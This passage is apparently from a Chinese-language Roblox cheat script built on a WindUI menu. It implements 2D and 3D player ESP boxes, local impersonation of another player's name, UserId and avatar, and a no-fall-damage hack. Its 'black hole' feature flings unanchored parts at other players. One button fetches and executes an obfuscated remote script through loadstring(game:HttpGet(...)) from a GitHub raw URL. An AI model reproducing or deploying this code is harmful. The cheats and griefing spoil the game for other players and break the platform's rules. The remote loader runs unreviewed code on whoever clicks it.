        local hue = 0

        while task.wait(0.01) do
            if getgenv().BoxRainbow then
                hue += 0.008
                if hue >= 1 then hue = 0 end
                getgenv().BoxColor = Color3.fromHSV(hue,1,1)
            end

            if not getgenv().Box2D_Active then
                ClearBoxLines()
                continue
            end

            local boxIndex = 1

            for _,plr in ipairs(Players:GetPlayers()) do
                if plr == LocalPlayer then continue end

                local char = plr.Character
                if not char then continue end

                local hum = char:FindFirstChildOfClass("Humanoid")
                if not hum or hum.Health <= 0 then continue end

                local root = char:FindFirstChild("HumanoidRootPart")
                local head = char:FindFirstChild("Head")
                if not root or not head then continue end

                local hrpVec = Camera:WorldToViewportPoint(root.Position)
                local headVec = Camera:WorldToViewportPoint(head.Position)

                if hrpVec.Z <= 0 or headVec.Z <= 0 then continue end

                local screenHrp = Vector2.new(hrpVec.X, hrpVec.Y)
                local screenHead = Vector2.new(headVec.X, headVec.Y)

                local height = (screenHrp - screenHead).Magnitude * 2.2
                local width = height * 0.35

                local topY = screenHead.Y - height * 0.4
                local bottomY = screenHrp.Y + height * 0.5
                local centerX = screenHead.X
                local left = centerX - width
                local right = centerX + width

                local corners = {
                    Vector2.new(left, topY),
                    Vector2.new(right, topY),
                    Vector2.new(right, bottomY),
                    Vector2.new(left, bottomY),
                }

                local edges = {{1,2},{2,3},{3,4},{4,1}}

                for _,edge in ipairs(edges) do
                    local l = BoxLines[boxIndex] or NewBoxLine()
                    l.Color = getgenv().BoxColor
                    l.Thickness = getgenv().BoxThickness
                    l.From = corners[edge[1]]
                    l.To = corners[edge[2]]
                    l.Visible = true
                    boxIndex += 1
                end
            end

            for i = boxIndex, #BoxLines do
                BoxLines[i].Visible = false
            end
        end
    end)

    Tabs.XrayTab:Toggle({
        Title = "2D方框ESP",
        Value = false,
        Callback = function(state)
            getgenv().Box2D_Active = state
        end
    })

    Tabs.XrayTab:Colorpicker({
        Title = "方框颜色",
        Default = Color3.new(0,1,1),
        Callback = function(color)
            getgenv().BoxColor = color
        end
    })

    Tabs.XrayTab:Toggle({
        Title = "方框彩虹",
        Value = false,
        Callback = function(state)
            getgenv().BoxRainbow = state
        end
    })

    Tabs.XrayTab:Input({
        Title = "方框粗细",
        Value = "2",
        Callback = function(input)
            local num = tonumber(input)
            if num then
                getgenv().BoxThickness = math.clamp(num,0.1,20)
            end
        end
    })
end)

Tabs.XrayTab:Section({Title = "3d方框"})

pcall(function()
    getgenv().BoxESP_Active = false
    getgenv().BoxColor = Color3.new(0,1,1)
    getgenv().BoxRainbow = false
    getgenv().BoxThickness = 2

    local BoxLines = {}
    local function ClearBoxLines()
        for _,line in pairs(BoxLines) do
            pcall(function() line:Remove() end)
        end
        table.clear(BoxLines)
    end
    local function NewBoxLine()
        local l = Drawing.new("Line")
        l.Thickness = getgenv().BoxThickness
        l.Color = getgenv().BoxColor
        l.Transparency = 1
        l.Visible = false
        table.insert(BoxLines,l)
        return l
    end

    task.spawn(function()
        local Camera = workspace.CurrentCamera
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local hue = 0
        while task.wait(0.01) do
            if getgenv().BoxRainbow then
                hue += 0.008
                if hue >= 1 then hue = 0 end
                getgenv().BoxColor = Color3.fromHSV(hue,1,1)
            end
            if not getgenv().BoxESP_Active then
                ClearBoxLines()
                continue
            end
            local boxIndex = 1
            for _,plr in ipairs(Players:GetPlayers()) do
                if plr == LocalPlayer then continue end
                local char = plr.Character
                if not char then continue end
                local hum = char:FindFirstChildOfClass("Humanoid")
                if not hum or hum.Health <= 0 then continue end
                local root = char:FindFirstChild("HumanoidRootPart")
                local head = char:FindFirstChild("Head")
                if not root or not head then continue end

                local totalHeight = 2.8
                local width = 0.65
                local depth = 0.35

                local cframe = root.CFrame
                local corners = {
                    cframe:PointToWorldSpace(Vector3.new(-width, totalHeight/2, -depth)),
                    cframe:PointToWorldSpace(Vector3.new(width, totalHeight/2, -depth)),
                    cframe:PointToWorldSpace(Vector3.new(width, totalHeight/2, depth)),
                    cframe:PointToWorldSpace(Vector3.new(-width, totalHeight/2, depth)),

                    cframe:PointToWorldSpace(Vector3.new(-width, -totalHeight/2, -depth)),
                    cframe:PointToWorldSpace(Vector3.new(width, -totalHeight/2, -depth)),
                    cframe:PointToWorldSpace(Vector3.new(width, -totalHeight/2, depth)),
                    cframe:PointToWorldSpace(Vector3.new(-width, -totalHeight/2, depth)),
                }
                local screen = {}
                local validCorners = true
                for i,v in ipairs(corners) do
                    local vec,vis = Camera:WorldToViewportPoint(v)
                    screen[i] = {Pos = Vector2.new(vec.X,vec.Y), Depth = vec.Z, Visible = vis}
                    if vec.Z < 0 then
                        validCorners = false
                    end
                end
                if not validCorners then continue end

                local boxEdges = {
                    {1,2},{2,3},{3,4},{4,1},
                    {5,6},{6,7},{7,8},{8,5},
                    {1,5},{2,6},{3,7},{4,8}
                }
                for _,edge in ipairs(boxEdges) do
                    local p1 = screen[edge[1]]
                    local p2 = screen[edge[2]]
                    if p1.Depth > 0 and p2.Depth > 0 then
                        local l = BoxLines[boxIndex] or NewBoxLine()
                        l.Color = getgenv().BoxColor
                        l.Thickness = getgenv().BoxThickness
                        l.From = p1.Pos
                        l.To = p2.Pos
                        l.Visible = true
                        boxIndex += 1
                    end
                end
            end
            for i = boxIndex,#BoxLines do
                BoxLines[i].Visible = false
            end
        end
    end)

    Tabs.XrayTab:Toggle({
        Title = "方框ESP",
        Value = false,
        Callback = function(state)
            getgenv().BoxESP_Active = state
        end
    })

    Tabs.XrayTab:Colorpicker({
        Title = "方框颜色",
        Default = Color3.new(0,1,1),
        Callback = function(color)
            getgenv().BoxColor = color
        end
    })

    Tabs.XrayTab:Toggle({
        Title = "方框彩虹",
        Value = false,
        Callback = function(state)
            getgenv().BoxRainbow = state
        end
    })

    Tabs.XrayTab:Input({
        Title = "方框粗细",
        Value = "2",
        Callback = function(input)
            local num = tonumber(input)
            if num then
                getgenv().BoxThickness = math.clamp(num,0.1,20)
            end
        end
    })
end)
getgenv().FakeInfo = {
    TargetName = "",
    TargetUserId = "",
    OnlineMode = false
}

Tabs.FakeTab:Section({Title = "玩家本地伪装"})

Tabs.FakeTab:Toggle({
    Title = "在线查找模式",
    Description = "开启：仅查找当前服务器内的玩家；关闭：自由输入任意名字UID",
    Icon = "search",
    Default = getgenv().FakeInfo.OnlineMode,
    Callback = function(s)
        getgenv().FakeInfo.OnlineMode = s
    end
})

Tabs.FakeTab:Section({Title = "在线模式仅伪装在服务器玩儿家离线模式需要输入uid"})

Tabs.FakeTab:Input({
    Title = "伪装名称",
    Value = getgenv().FakeInfo.TargetName,
    Placeholder = "填写玩家名称",
    Callback = function(text)
        local str = text:gsub("%s","")
        getgenv().FakeInfo.TargetName = str
    end
})

Tabs.FakeTab:Input({
    Title = "伪装UserId",
    Value = getgenv().FakeInfo.TargetUserId,
    Placeholder = "填写玩家UID",
    Callback = function(text)
        local str = text:gsub("%s","")
        getgenv().FakeInfo.TargetUserId = str
    end
})

Tabs.FakeTab:Button({
    Title = "匹配并应用伪装（名字+UID+外观）",
    Callback = function()
        local Players = game:GetService("Players")
        local localPlr = Players.LocalPlayer
        local info = getgenv().FakeInfo
        local searchName = info.TargetName:lower()

        if info.OnlineMode then
            -- 在线模式：本局找人
            if searchName == "" then
                WindUI:Notify({Title="提示",Content="请输入玩家名字",Duration=2})
                return
            end
            local targetPlr = nil
            for _,plr in ipairs(Players:GetPlayers()) do
                if plr ~= localPlr and (plr.Name:lower() == searchName or plr.DisplayName:lower() == searchName) then
                    targetPlr = plr
                    break
                end
            end
            if not targetPlr then
                WindUI:Notify({Title="❌未找到",Content="当前服务器不存在该玩家",Duration=3})
                return
            end
            info.TargetName = targetPlr.Name
            info.TargetUserId = tostring(targetPlr.UserId)
        else
            if info.TargetName == "" or info.TargetUserId == "" then
                WindUI:Notify({Title="提示",Content="名称和UserId不能为空",Duration=2})
                return
            end
        end

        localPlr.Name = info.TargetName
        localPlr.UserId = tonumber(info.TargetUserId)

        local success, desc = pcall(function()
            return Players:GetHumanoidDescriptionFromUserId(tonumber(info.TargetUserId))
        end)
        if success and desc then
            local char = localPlr.Character or localPlr.CharacterAdded:Wait()
            local hum = char:WaitForChild("Humanoid")
            hum:ApplyDescription(desc)
            WindUI:Notify({Title="✅伪装成功",Content = info.TargetName.." | "..info.TargetUserId.."，外观已替换", Duration = 3})
        else
            WindUI:Notify({Title="⚠️外观加载失败",Content="名字UID已改，但拉不到该玩家外观", Duration = 3})
        end
    end
})

Tabs.FakeTab:Button({
    Title = "恢复自身原始信息+外观",
    Callback = function()
        local Players = game:GetService("Players")
        local localPlr = Players.LocalPlayer
        localPlr.Name = localPlr.Name
        localPlr.UserId = localPlr.UserId
        local success, desc = pcall(function()
            return Players:GetHumanoidDescriptionFromUserId(localPlr.UserId)
        end)
        if success and desc then
            local char = localPlr.Character or localPlr.CharacterAdded:Wait()
            local hum = char:WaitForChild("Humanoid")
            hum:ApplyDescription(desc)
        end
        WindUI:Notify({Title="✅已还原",Content="名字、UID、外观全部恢复原样",Duration=2})
    end
})

getgenv().Gyro = {
    Conn = nil,
    BaseRot = nil,
    SpeedX = 2.3,
    SpeedY = 2.3,
    InvX = false,
    InvY = false
}


Tabs.GyroTab:Toggle({
    Title = "陀螺仪镜头",
    Description = "总开关：开启后转动手机控制视角",
    Icon = "check",
    Default = false,
    Callback = function(state)
        local g = getgenv().Gyro
        local UserInputService = game:GetService("UserInputService")
        local RunService = game:GetService("RunService")
        local Camera = workspace.CurrentCamera
        if state then
            if not UserInputService.GyroscopeEnabled then
                WindUI:Notify({Title = "陀螺仪", Content = "⚠️ 当前设备不支持陀螺仪", Duration = 3})
                return
            end
            g.BaseRot = UserInputService:GetDeviceRotation()
            g.Conn = RunService.RenderStepped:Connect(function()
                local rot = UserInputService:GetDeviceRotation()
                local dx = (rot.X - g.BaseRot.X) * g.SpeedX * (g.InvX and -1 or 1)
                local dy = (rot.Y - g.BaseRot.Y) * g.SpeedY * (g.InvY and -1 or 1)
                Camera.CFrame *= CFrame.Angles(dy, dx, 0)
                g.BaseRot = rot
            end)
        else
            if g.Conn then
                g.Conn:Disconnect()
                g.Conn = nil
            end
            g.BaseRot = nil
        end
    end
})

Tabs.GyroTab:Button({
    Title = "🔄 重置陀螺仪校准原点",
    Description = "把手机放平后点此按钮重新校准",
    Callback = function()
        local g = getgenv().Gyro
        local UserInputService = game:GetService("UserInputService")
        if UserInputService.GyroscopeEnabled then
            g.BaseRot = UserInputService:GetDeviceRotation()
            WindUI:Notify({Title="陀螺仪",Content="✅ 已重新校准原点，请放平手机",Duration=2})
        else
            WindUI:Notify({Title="陀螺仪",Content="⚠️设备不支持陀螺仪",Duration=2})
        end
    end
})

Tabs.GyroTab:Input({
    Title = "左右速度输入",
    Value = tostring(getgenv().Gyro.SpeedX),
    Placeholder = "输入0.1 ~ 20，回车生效",
    Callback = function(text)
        local num = tonumber(text:gsub("%s",""))
        if num and num >=0.1 and num <=20 then
            getgenv().Gyro.SpeedX = num
        end
    end
})

Tabs.GyroTab:Input({
    Title = "上下速度输入",
    Value = tostring(getgenv().Gyro.SpeedY),
    Placeholder = "输入0.1 ~ 20，回车生效",
    Callback = function(text)
        local num = tonumber(text:gsub("%s",""))
        if num and num >=0.1 and num <=20 then
            getgenv().Gyro.SpeedY = num
        end
    end
})

Tabs.GyroTab:Toggle({
    Title = "左右反转",
    Description = "手机左转镜头往右",
    Icon = "repeat",
    Default = getgenv().Gyro.InvX,
    Callback = function(s)
        getgenv().Gyro.InvX = s
    end
})

Tabs.GyroTab:Toggle({
    Title = "上下反转",
    Description = "手机上抬镜头往下",
    Icon = "repeat",
    Default = getgenv().Gyro.InvY,
    Callback = function(s)
        getgenv().Gyro.InvY = s
    end
})

Tabs.NewTab:Toggle({
	Title = "无掉落伤害",
	Value = false,
	Callback = function(state)
		if state then
			task.spawn(function()
				local Players = game:GetService("Players")
				local RunService = game:GetService("RunService")
				local LocalPlayer = Players.LocalPlayer
				local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart",10)
				local loopConn
				local function refreshCharacter(char)
					Character = char
					HumanoidRootPart = char:WaitForChild("HumanoidRootPart",10)
				end
				local charConn = LocalPlayer.CharacterAdded:Connect(refreshCharacter)
				local function safeSetHiddenProperty()
					pcall(function()
						sethiddenproperty(LocalPlayer,"SimulationRadius",math.huge)
					end)
				end
				loopConn = RunService.Heartbeat:Connect(function()
					safeSetHiddenProperty()
					if HumanoidRootPart and HumanoidRootPart.Parent then
						local velocity = HumanoidRootPart.AssemblyLinearVelocity
						if velocity.Y < -45 then
							HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(velocity.X,0,velocity.Z)
						end
					end
				end)
				while state do
					task.wait()
				end
				loopConn:Disconnect()
				charConn:Disconnect()
			end)
		end
	end
})
getgenv().blackholeSettings = {
	radius = 50,
	height = 100,
	rotationSpeed = 10,
	attractionStrength = 1000,
	rotationCenter = "地图中心"
}
Tabs.BlackHoleTab:Toggle({
	Title = "黑洞物体旋转",
	Value = false,
	Callback = function(state)
		if state then
			task.spawn(function()
				local RunService = game:GetService("RunService")
				local trackedParts = {}
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart",10)

				local function refreshCharacter(char)
					Character = char
					HumanoidRootPart = char:WaitForChild("HumanoidRootPart",10)
				end
				local charConn = LocalPlayer.CharacterAdded:Connect(refreshCharacter)

				local function trackPart(obj)
					if obj and obj:IsA("BasePart") then
						local ok,receiveAge = pcall(function() return obj.ReceiveAge end)
						if ok and not obj.Anchored and receiveAge == 0 then
							trackedParts[obj] = true
						end
					end
				end
				local function untrackPart(obj)
					trackedParts[obj] = nil
				end

				for _,obj in ipairs(workspace:GetDescendants()) do
					trackPart(obj)
				end
				local addConn = workspace.DescendantAdded:Connect(trackPart)
				local removeConn = workspace.DescendantRemoving:Connect(untrackPart)

				local loopConn = RunService.Heartbeat:Connect(function()
					local center
					if getgenv().blackholeSettings.rotationCenter == "地图中心" then
						center = Vector3.new(-280.30718994141,179.69993591309,341.18765258789)
					else
						if HumanoidRootPart and HumanoidRootPart.Parent then
							center = HumanoidRootPart.Position
						else
							center = Vector3.new(-280.30718994141,179.69993591309,341.18765258789)
						end
					end
					for part in pairs(trackedParts) do
						if part and part.Parent and part:IsA("BasePart") and not part.Anchored then
							local position = part.Position
							local offset = position - center
							local distance = offset.Magnitude
							local planar = math.max(0.1,math.min(getgenv().blackholeSettings.radius,distance))
							local angle = math.atan2(position.Z-center.Z,position.X-center.X)+math.rad(getgenv().blackholeSettings.rotationSpeed)
							local target = Vector3.new(
								center.X + math.cos(angle)*planar,
								center.Y + getgenv().blackholeSettings.height*math.abs(math.sin((position.Y-center.Y)/getgenv().blackholeSettings.height)),
								center.Z + math.sin(angle)*planar
							)
							local direction = target - position
							if direction.Magnitude>0 then
								local velocity = direction.Unit * getgenv().blackholeSettings.attractionStrength
								pcall(function()
									part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
									part.CanCollide = false
									part.AssemblyLinearVelocity = velocity
									part.Velocity = velocity
								end)
							end
						else
							trackedParts[part] = nil
						end
					end
				end)
				while state do task.wait() end
				loopConn:Disconnect()
				addConn:Disconnect()
				removeConn:Disconnect()
				charConn:Disconnect()
			end)
		end
	end
})

Tabs.BlackHoleTab:Input({
	Title = "黑洞半径",
	Value = "50",
	Numeric = true,
	Callback = function(v)
		getgenv().blackholeSettings.radius = tonumber(v) or 50
	end
})

Tabs.BlackHoleTab:Input({
	Title = "黑洞高度",
	Value = "100",
	Numeric = true,
	Callback = function(v)
		getgenv().blackholeSettings.height = tonumber(v) or 100
	end
})

Tabs.BlackHoleTab:Input({
	Title = "旋转速度",
	Value = "10",
	Numeric = true,
	Callback = function(v)
		getgenv().blackholeSettings.rotationSpeed = tonumber(v) or 10
	end
})

Tabs.BlackHoleTab:Input({
	Title = "吸引力强度",
	Value = "1000",
	Numeric = true,
	Callback = function(v)
		getgenv().blackholeSettings.attractionStrength = tonumber(v) or 1000
	end
})

Tabs.BlackHoleTab:Dropdown({
	Title = "旋转中心",
	Values = {"角色","地图中心"},
	Value = "地图中心",
	Callback = function(v)
		getgenv().blackholeSettings.rotationCenter = v
	end
})

Tabs.danceTab:Button({
	Title = "跳舞修改动画包",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/obfuscation/refs/heads/main/dance%20gui"))()
	end 
})

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local localPlayer = Players.LocalPlayer
local PlayerGui = localPlayer:WaitForChild("PlayerGui")

local allowedNames = {
    ["godwhy532"] = true,
    ["kjkalt"] = true
}

if allowedNames[localPlayer.Name] then
    task.spawn(function()
        local notifyGui = Instance.new("ScreenGui")
        notifyGui.Name = "WelcomeNotify"
        notifyGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        notifyGui.Parent = PlayerGui

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0,280,0,80)
        frame.Position = UDim2.new(0.02,0,0.05,0)
        frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
        frame.BackgroundTransparency = 1
        frame.Parent = notifyGui

        
        local uiCorner = Instance.new("UICorner")
        uiCorner.CornerRadius = UDim.new(0,12)
        uiCorner.Parent = frame

        local icon = Instance.new("ImageLabel")
        icon.Size = UDim2.new(0,50,0,50)
        icon.Position = UDim2.new(0.05,0,0.18,0)
        icon.BackgroundTransparency = 1
        icon.Image = "rbxassetid://115187273703029"
        icon.ImageTransparency = 1
        icon.Parent = frame

        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(0.7,0,0,30)
        title.Position = UDim2.new(0.25,0,0.05,0)
        title.BackgroundTransparency = 1
        title.Text = "🎉 欢迎"
        title.Font = Enum.Font.GothamBold
        title.TextSize = 22
        title.TextColor3 = Color3.new(1,1,1)
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.TextTransparency = 1
        title.Parent = frame

        local desc = Instance.new("TextLabel")
        desc.Size = UDim2.new(0.7,0,0,24)
        desc.Position = UDim2.new(0.25,0,0.42,0)
        desc.BackgroundTransparency = 1
        desc.Text = "欢迎鹿脚本制作人加入游戏"
        desc.Font = Enum.Font.Gotham
        desc.TextSize = 14
        desc.TextColor3 = Color3.new(0.9,0.9,0.9)
        desc.TextXAlignment = Enum.TextXAlignment.Left
        desc.TextTransparency = 1
        desc.Parent = frame

        
        local tweenIn = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.1})
        local iconTweenIn = TweenService:Create(icon, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 0})
        local titleTweenIn = TweenService:Create(title, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0})
        local descTweenIn = TweenService:Create(desc, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0})

        tweenIn:Play()
        iconTweenIn:Play()
        titleTweenIn:Play()
        descTweenIn:Play()

        task.wait(4.5)

        
        local tweenOut = TweenService:Create(frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1})
        local iconTweenOut = TweenService:Create(icon, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {ImageTransparency = 1})
        local titleTweenOut = TweenService:Create(title, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {TextTransparency = 1})
        local descTweenOut = TweenService:Create(desc, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {TextTransparency = 1})

        tweenOut:Play()
        iconTweenOut:Play()
        titleTweenOut:Play()
        descTweenOut:Play()

        tweenOut.Completed:Wait()
        notifyGui:Destroy()
    end)
end